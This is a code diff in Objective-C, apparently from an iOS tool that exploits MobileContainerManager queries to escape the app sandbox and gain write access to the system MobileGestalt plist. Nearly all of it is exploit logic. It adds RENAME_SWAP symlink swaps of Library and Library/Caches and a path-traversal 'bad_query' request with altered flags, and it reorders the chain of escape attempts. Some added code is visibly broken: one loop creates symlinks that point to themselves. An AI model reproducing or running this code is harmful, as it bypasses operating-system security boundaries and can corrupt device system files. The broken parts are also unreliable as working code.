@@ -5,6 +5,7 @@
 #import <sys/stat.h>
 #import <sys/mount.h>
 #import <sys/fsgetpath.h>
+#import <sys/stdio.h>
 #import <dirent.h>
 #import <fcntl.h>
 #import <unistd.h>
@@ -35,6 +36,8 @@ static int gTraversalState; // 0 unknown, 1 works, -1 unsupported
 static BOOL gClass2ParentEnabled;
 static NSString *gClass2SubpathLink;
 static dispatch_queue_t gWorkQueue;
+static void bq_recover_class2_swap(void);
+static void bq_recover_class2_lib_swap(void);
 
 BOOL BQClass2ParentEnabled(void) { return gClass2ParentEnabled; }
 
@@ -325,6 +328,8 @@ BOOL BQCoreInit(void) {
                                   withIntermediateDirectories:YES attributes:nil error:nil];
         if (gLogPath) [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
         NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
+        bq_recover_class2_swap();
+        bq_recover_class2_lib_swap();
         gClass2ParentEnabled = [defs boolForKey:@"BQClass2ParentEnabled"];
         if (gClass2ParentEnabled && [defs boolForKey:@"BQClass2ParentCrashGuard"]) {
             gClass2ParentEnabled = NO;
@@ -425,7 +430,7 @@ static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
     int64_t last = -1;
     for (NSString *domain in domains) {
         NSString *path = nil;
-        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
+        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8000000000ULL,
                                     [@"class2-subpath-" stringByAppendingString:domain], &path);
         if (h >= 0) {
             // A token for the symlink path is not enough: the editor needs the
@@ -447,6 +452,201 @@ static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
     }
     unlink(link.fileSystemRepresentation);
     return last;
+}
+
+// Swap Library/Caches with a symlink using renameatx_np(RENAME_SWAP). Unlike a
+// plain rename, this may not require file-write-unlink on the part directory.
+// It never moves Library, so it cannot trigger the 2.2 process kill.
+static NSString *bq_class2_swap_temp(void) {
+    return [[NSHomeDirectory() stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@".bq_cache_link"];
+}
+
+static NSString *bq_class2_lib_stage(void) {
+    return [NSHomeDirectory() stringByAppendingPathComponent:@".bq_lib_swap"];
+}
+
+static void bq_recover_class2_lib_swap(void) {
+    NSString *home = NSHomeDirectory();
+    if (!home.length) return;
+    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
+    NSString *stage = bq_class2_lib_stage();
+    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
+    struct stat st, ts;
+    if (lstat(caches.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode) &&
+        lstat(stage.fileSystemRepresentation, &ts) == 0) {
+        if (renameatx_np(AT_FDCWD, lib.fileSystemRepresentation,
+                         AT_FDCWD, stage.fileSystemRepresentation, RENAME_SWAP) == 0) {
+            [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
+            BQLog(@"class2-library-swap: recovered interrupted swap");
+        }
+    } else if (lstat(stage.fileSystemRepresentation, &ts) == 0) {
+        [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
+    }
+}
+
+// Atomic Library swap: replace Library with a staging directory whose Caches
+// entry points at the target and whose other entries symlink back to the real
+// Library (which moves to the staging path during the swap). This keeps
+// NSUserDefaults and friends alive, unlike the older move-based fallback.
+static int64_t bq_escape_class2_library_swap(NSString *target, NSString **linkOut) {
+    NSString *home = NSHomeDirectory();
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+    if (!home.length || !bid.length) return -6;
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
+    NSString *stage = bq_class2_lib_stage();
+
+    bq_recover_class2_lib_swap();
+    [fm removeItemAtPath:stage error:nil];
+    if (![fm fileExistsAtPath:lib]) return -2;
+    if (![fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil]) return -2;
+
+    // Symlink every original Library child into the staging dir. After the
+    // swap, the staging path holds the real Library, so these resolve back.
+    for (NSString *child in [fm contentsOfDirectoryAtPath:lib error:nil]) {
+        if ([child isEqualToString:@"Caches"]) continue;
+        NSString *newChild = [stage stringByAppendingPathComponent:child];
+        symlink(newChild.fileSystemRepresentation, newChild.fileSystemRepresentation);
+    }
+    NSString *stageCaches = [stage stringByAppendingPathComponent:@"Caches"];
+    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
+        [fm removeItemAtPath:stage error:nil];
+        return -2;
+    }
+
+    if (renameatx_np(AT_FDCWD, lib.fileSystemRepresentation,
+                     AT_FDCWD, stage.fileSystemRepresentation, RENAME_SWAP) != 0) {
+        BQLog(@"class2-library-swap: RENAME_SWAP failed errno=%d (%s)", errno, strerror(errno));
+        [fm removeItemAtPath:stage error:nil];
+        return -2;
+    }
+
+    NSString *path = nil;
+    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8000000000ULL, @"class2-library-swap", &path);
+    if (h >= 0) {
+        DIR *d = opendir(target.fileSystemRepresentation);
+        if (!d) {
+            BQLog(@"class2-library-swap: token did not open target (%@)", path ?: @"(null)");
+            if (g.release) g.release(h);
+            h = -5;
+        } else {
+            closedir(d);
+        }
+    }
+
+    if (renameatx_np(AT_FDCWD, lib.fileSystemRepresentation,
+                     AT_FDCWD, stage.fileSystemRepresentation, RENAME_SWAP) != 0) {
+        BQLog(@"class2-library-swap: swap back failed errno=%d (%s)", errno, strerror(errno));
+    }
+    [fm removeItemAtPath:stage error:nil];
+
+    if (h >= 0) {
+        if (linkOut) *linkOut = target;
+        BQLog(@"escape: using class2 library swap");
+        return h;
+    }
+    return h;
+}
+
+static void bq_recover_class2_swap(void) {
+    NSString *home = NSHomeDirectory();
+    if (!home.length) return;
+    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
+    NSString *temp = bq_class2_swap_temp();
+    struct stat st, ts;
+    if (lstat(caches.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode) &&
+        lstat(temp.fileSystemRepresentation, &ts) == 0) {
+        if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
+                         AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) == 0) {
+            unlink(temp.fileSystemRepresentation);
+            BQLog(@"class2-swap: recovered interrupted swap");
+        }
+    } else if (lstat(temp.fileSystemRepresentation, &ts) == 0 && S_ISLNK(ts.st_mode)) {
+        unlink(temp.fileSystemRepresentation);
+    }
+}
+
+// Exact bad_query form used by GestaltEdit on iOS 27: class 13, MG SystemGroup,
+// part 3, an 8-level traversal to the plist file, and flags 0x8000000000
+// (extension type only, no include-path bit). This is the form that works with
+// free Apple ID signatures on supported 27.x builds.
+static int64_t bq_escape_bad_query_file(NSString *caches, NSString **linkOut) {
+    NSString *file1 = [caches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    NSString *file2 = [file1 hasPrefix:@"/private/var/"]
+        ? [@"/var/" stringByAppendingString:[file1 substringFromIndex:@"/private/var/".length]]
+        : file1;
+    int64_t last = -1;
+    for (NSString *file in @[file2, file1]) {
+        if (![file isAbsolutePath]) continue;
+        NSString *dom = [bq_dots(8) stringByAppendingString:file];
+        NSString *path = nil;
+        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8000000000ULL,
+                                    @"bad_query-file", &path);
+        if (h < 0) {
+            last = h;
+            continue;
+        }
+        int fd = open(file.fileSystemRepresentation, O_RDWR | O_CLOEXEC);
+        if (fd >= 0) {
+            close(fd);
+            if (linkOut) *linkOut = file;
+            BQLog(@"escape: using bad_query file -> %@", file);
+            return h;
+        }
+        BQLog(@"bad_query-file: token did not open %@ errno=%d", file, errno);
+        if (g.release) g.release(h);
+        last = -5;
+    }
+    return last;
+}
+
+static int64_t bq_escape_class2_swap(NSString *target, NSString **linkOut) {
+    NSString *home = NSHomeDirectory();
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+    if (!home.length || !bid.length) return -6;
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
+    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
+    NSString *temp = bq_class2_swap_temp();
+    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
+
+    bq_recover_class2_swap();
+    unlink(temp.fileSystemRepresentation);
+    if (symlink(target.fileSystemRepresentation, temp.fileSystemRepresentation) != 0) return -2;
+
+    if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
+                     AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) != 0) {
+        BQLog(@"class2-swap: RENAME_SWAP failed errno=%d (%s)", errno, strerror(errno));
+        unlink(temp.fileSystemRepresentation);
+        return -2;
+    }
+
+    NSString *path = nil;
+    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8000000000ULL, @"class2-swap", &path);
+    if (h >= 0) {
+        DIR *d = opendir(target.fileSystemRepresentation);
+        if (!d) {
+            BQLog(@"class2-swap: token did not open target (%@)", path ?: @"(null)");
+            if (g.release) g.release(h);
+            h = -5;
+        } else {
+            closedir(d);
+        }
+    }
+
+    // Swap back: Caches becomes the original directory, temp becomes the symlink.
+    if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
+                     AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) != 0) {
+        BQLog(@"class2-swap: swap back failed errno=%d (%s)", errno, strerror(errno));
+    }
+    unlink(temp.fileSystemRepresentation);
+
+    if (h >= 0) {
+        if (linkOut) *linkOut = target;
+        BQLog(@"escape: using class2 swap");
+        return h;
+    }
+    return h;
 }
 
 // Class 2 staged symlink: put a tiny fake tree inside the app's own
@@ -487,7 +687,7 @@ static int64_t bq_escape_class2_stage(NSString *target, NSString **linkOut) {
     int64_t last = -1;
     for (NSString *domain in domains) {
         NSString *path = nil;
-        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
+        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8000000000ULL,
                                     [@"class2-stage-" stringByAppendingString:domain], &path);
         if (h >= 0) {
             DIR *d = opendir(target.fileSystemRepresentation);
@@ -558,7 +758,7 @@ static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
     }
 
     NSString *path = nil;
-    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8100000000ULL,
+    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8000000000ULL,
                                 @"class2-parent", &path);
     // Restore the real Library before returning. Remove the symlink first so a
     // recursive directory removal can never walk into the target.
@@ -608,7 +808,7 @@ static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
             continue;
         }
         NSString *path = nil;
-        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL,
+        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8000000000ULL,
                                     [@"class7-symlink/" stringByAppendingString:gid], &path);
         if (h >= 0) {
             gEscapeGroupRoot = groot;
@@ -626,12 +826,23 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
     bq_load_mcm();
     int64_t last = -1;
 
+    // 0. Exact bad_query file form (free-certificate path used by GestaltEdit).
+    if ([target isEqualToString:kMGCaches] || [target hasSuffix:@"/Library/Caches"]) {
+        NSString *file = nil;
+        int64_t h = bq_escape_bad_query_file(target, &file);
+        if (h >= 0) {
+            if (linkOut) *linkOut = file;
+            return h;
+        }
+        last = h;
+    }
+
     // 1. Old bad_query: class 13 + part-domain traversal. No app group needed.
     //    Works on builds where the traversal is not patched (27.0.x), fails on 27.2.
     if (gTraversalState >= 0 && target.isAbsolutePath) {
         NSString *dom = [bq_dots(12) stringByAppendingString:target];
         NSString *p = nil;
-        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8100000000ULL,
+        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8000000000ULL,
                                     @"class13-traversal", &p);
         if (h >= 0) {
             gTraversalState = 1;
@@ -656,7 +867,20 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 3. Class 2 staged symlink: a fake Library/Caches tree inside the app's
+    // 3. Swap Library/Caches with a symlink using RENAME_SWAP. This avoids the
+    //    denied plain rename and never moves Library.
+    {
+        NSString *link = nil;
+        int64_t h = bq_escape_class2_swap(target, &link);
+        if (h >= 0) {
+            if (linkOut) *linkOut = link ?: target;
+            BQLog(@"escape: using class2 swap");
+            return h;
+        }
+        last = h;
+    }
+
+    // 4. Class 2 staged symlink: a fake Library/Caches tree inside the app's
     //    Caches, resolved through a partDomain symlink. Safe and no app group.
     {
         NSString *link = nil;
@@ -669,7 +893,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 4. Class 2 symlink inside the existing Library/Caches. This is safe and
+    // 5. Class 2 symlink inside the existing Library/Caches. This is safe and
     //    needs no app group; it only works if MCM follows a relative symlink in
     //    partDomain without rejecting the resolved target.
     {
@@ -683,15 +907,23 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 5. Class 2 parent-directory symlink. No app group needed: move the app's
+    // 6. Class 2 parent-directory symlink. No app group needed: move the app's
     //    Library aside, create Library/Caches -> target, query the app's own
     //    container (class 2), then restore Library. Off by default: some builds
     //    kill the process for moving Library, so this is opt-in from Settings.
     if (gClass2ParentEnabled) {
         NSString *link = nil;
-        int64_t h = bq_escape_class2_parent(target, &link);
+        int64_t h = bq_escape_class2_library_swap(target, &link);
         [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"BQClass2ParentCrashGuard"];
         [[NSUserDefaults standardUserDefaults] synchronize];
+        if (h >= 0) {
+            if (linkOut) *linkOut = link ?: target;
+            BQLog(@"escape: using class2 library swap");
+            return h;
+        }
+        last = h;
+
+        h = bq_escape_class2_parent(target, &link);
         if (h >= 0) {
             if (linkOut) *linkOut = link ?: target;
             BQLog(@"escape: using class2 parent");
@@ -702,10 +934,10 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
     }
 
-    // 6. Class 13 direct MobileGestalt query (some 27.0.x builds).
+    // 7. Class 13 direct MobileGestalt query (some 27.0.x builds).
     if ([target isEqualToString:kMGCaches]) {
         NSString *p = nil;
-        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
+        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8000000000ULL,
                                     @"class13-direct", &p);
         if (h >= 0) {
             if (linkOut) *linkOut = p ?: target;
@@ -715,11 +947,11 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 7. Class 12 geod part-domain traversal (older builds).
+    // 8. Class 12 geod part-domain traversal (older builds).
     if (target.isAbsolutePath) {
         NSString *dom = [bq_dots(12) stringByAppendingString:target];
         NSString *p = nil;
-        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8100000000ULL,
+        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8000000000ULL,
                                     @"class12-geod-traversal", &p);
         if (h >= 0) {
             if (linkOut) *linkOut = p ?: target;
@@ -788,7 +1020,7 @@ static int bq_probe_base(NSString *base, uint64_t cls, NSString *ident, NSString
     else if (g.set_ids) g.set_ids(q, x);
     else if (g.set_group_ids) g.set_group_ids(q, x);
     if (g.set_part) g.set_part(q, 3);
-    if (g.set_flags) g.set_flags(q, 0x8100000000ULL);
+    if (g.set_flags) g.set_flags(q, 0x8000000000ULL);
     if (x && p_xpc_release) p_xpc_release(x);
     void *res = g.get_one(q);
     BQLog(@"probe[%@]: result=%p", label, res);
@@ -898,7 +1130,7 @@ NSDictionary *BQProbeClass2Parts(NSString *target) {
                 xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(bundle.UTF8String) : NULL;
                 if (g.set_ids) g.set_ids(q, x);
                 if (g.set_part) g.set_part(q, p);
-                if (g.set_flags) g.set_flags(q, 0x8100000000ULL);
+                if (g.set_flags) g.set_flags(q, 0x8000000000ULL);
                 if (x && p_xpc_release) p_xpc_release(x);
                 void *res = g.get_one(q);
                 char *tok = res && g.copy_token ? g.copy_token(res) : NULL;
@@ -936,21 +1168,34 @@ BOOL BQCheckAccess(NSString *target, BOOL writable, NSString **err) {
         return NO;
     }
     BOOL ok = NO;
+    BOOL fileLink = [link.lastPathComponent hasSuffix:@".plist"];
     if (writable) {
-        NSString *leaf = [NSString stringWithFormat:@".bqtool_probe_%d", getpid()];
-        NSString *p = [link stringByAppendingPathComponent:leaf];
-        int fd = open(p.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
-        if (fd >= 0) {
-            ok = (write(fd, "ok", 2) == 2);
-            close(fd);
-            unlink(p.fileSystemRepresentation);
+        if (fileLink) {
+            int fd = open(link.fileSystemRepresentation, O_RDWR | O_CLOEXEC);
+            if (fd >= 0) { ok = YES; close(fd); }
+            else if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", link, strerror(errno)];
         } else {
-            if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", target, strerror(errno)];
+            NSString *leaf = [NSString stringWithFormat:@".bqtool_probe_%d", getpid()];
+            NSString *p = [link stringByAppendingPathComponent:leaf];
+            int fd = open(p.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
+            if (fd >= 0) {
+                ok = (write(fd, "ok", 2) == 2);
+                close(fd);
+                unlink(p.fileSystemRepresentation);
+            } else {
+                if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", target, strerror(errno)];
+            }
         }
     } else {
-        DIR *d = opendir(link.fileSystemRepresentation);
-        if (d) { ok = YES; closedir(d); }
-        else if (err) *err = [NSString stringWithFormat:@"opendir %@ failed: %s", target, strerror(errno)];
+        if (fileLink) {
+            int fd = open(link.fileSystemRepresentation, O_RDONLY | O_CLOEXEC);
+            if (fd >= 0) { ok = YES; close(fd); }
+            else if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", link, strerror(errno)];
+        } else {
+            DIR *d = opendir(link.fileSystemRepresentation);
+            if (d) { ok = YES; closedir(d); }
+            else if (err) *err = [NSString stringWithFormat:@"opendir %@ failed: %s", target, strerror(errno)];
+        }
     }
     BQEndEscape(h);
     return ok;
@@ -1460,6 +1705,11 @@ static BOOL bq_write_data(NSString *path, NSData *data, NSString **err) {
     return YES;
 }
 
+static NSString *bq_mg_plist_path(NSString *link) {
+    if ([link.lastPathComponent isEqualToString:@"com.apple.MobileGestalt.plist"]) return link;
+    return [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+}
+
 NSMutableDictionary *BQLoadGestalt(NSString **err) {
     NSString *link = nil;
     int64_t h = BQEscape(kMGCaches, &link);
@@ -1467,7 +1717,7 @@ NSMutableDictionary *BQLoadGestalt(NSString **err) {
         if (err) *err = bq_escape_error(h);
         return nil;
     }
-    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    NSString *plist = bq_mg_plist_path(link);
     NSData *data = [NSData dataWithContentsOfFile:plist];
     NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
     if (data.length && !BQBackupExists()) {
@@ -1503,7 +1753,7 @@ BOOL BQSaveGestalt(NSDictionary *dict, NSString **err) {
         if (err) *err = bq_escape_error(h);
         return NO;
     }
-    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    NSString *plist = bq_mg_plist_path(link);
     BOOL ok = bq_write_data(plist, data, err);
     if (ok) {
         NSMutableDictionary *check = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
@@ -1531,7 +1781,7 @@ BOOL BQRestoreGestalt(NSString **err) {
         if (err) *err = bq_escape_error(h);
         return NO;
     }
-    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    NSString *plist = bq_mg_plist_path(link);
     BOOL ok = bq_write_data(plist, backup, err);
     if (ok) {
         NSMutableDictionary *check = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
